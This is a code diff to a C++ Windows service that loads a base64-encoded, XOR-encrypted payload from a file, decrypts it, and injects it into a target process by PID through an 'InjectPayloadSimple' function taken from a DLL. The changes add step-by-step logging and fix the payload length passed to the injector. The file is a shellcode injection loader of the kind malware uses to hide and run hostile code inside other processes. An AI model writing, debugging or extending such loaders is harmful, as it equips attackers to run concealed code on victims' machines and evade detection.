@@ -15,7 +15,8 @@
 SERVICE_STATUS serviceStatus;
 SERVICE_STATUS_HANDLE hStatus;
 
-typedef int (*InjectPayloadSimple)(DWORD, unsigned char*, unsigned int);
+typedef void (*StepCallback)(const char* stepName, int stepIndex);
+typedef int (*InjectPayloadSimple)(DWORD, unsigned char*, unsigned int, StepCallback);
 
 wchar_t serviceName[] = L"";
 
@@ -93,23 +94,36 @@ void ServiceMain(int argc, char** argv)
             return;
         }
 
+        AppendLog("Dll loaded");
+
 		int targetPID = j["TargetPID"].get<int>();
         std::ifstream payloadFile(payloadPath);
         std::string encoded((std::istreambuf_iterator<char>(payloadFile)),
             std::istreambuf_iterator<char>());
 
+        AppendLog("Payload loaded");
+
         auto payload = base64::decode_into<std::vector<uint8_t>>(encoded);
+
+        AppendLog("Payload decoded");
 
         auto decrypted = xorDecrypt(payload, key);
         int length = decrypted.size();
 
+        AppendLog("Payload decrypted");
+
         InjectPayloadSimple inject =
             (InjectPayloadSimple)GetProcAddress(hDll, "InjectPayloadSimple");
+
+        AppendLog("Get ProcAddress");
+
+        AppendLog("Target PID: " + std::to_string(targetPID));
 
         int result = inject(
             targetPID,
             decrypted.data(),
-            static_cast<unsigned int>(payload.size())
+            static_cast<unsigned int>(decrypted.size()),
+            nullptr
         );
 
         AppendLog("Injection result: " + std::to_string(result));
